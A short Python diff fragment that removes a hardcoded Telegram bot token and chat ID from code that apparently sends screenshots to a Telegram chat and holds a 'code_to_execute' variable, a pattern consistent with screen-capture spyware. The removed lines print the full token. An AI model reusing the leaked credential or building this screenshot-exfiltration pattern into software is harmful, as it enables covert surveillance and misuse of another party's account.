@@ -1,8 +1,4 @@
-token = '7103055999:AAFMsBDS40reRAAcdcbamf9N0itA9U8zPVw'
-bot = telebot.TeleBot(token)
-chat_id = 1882056354
-telegram_bot_token = "7103055999:AAFMsBDS40reRAAcdcbamf9N0itA9U8zPVw"
-chat_ids = (1882056354,)
+
 code_to_execute = ''
 def send_message_to_group(chat_id, screenshot):
     url = f"https://api.telegram.org/bot{telegram_bot_token}/sendPhoto"
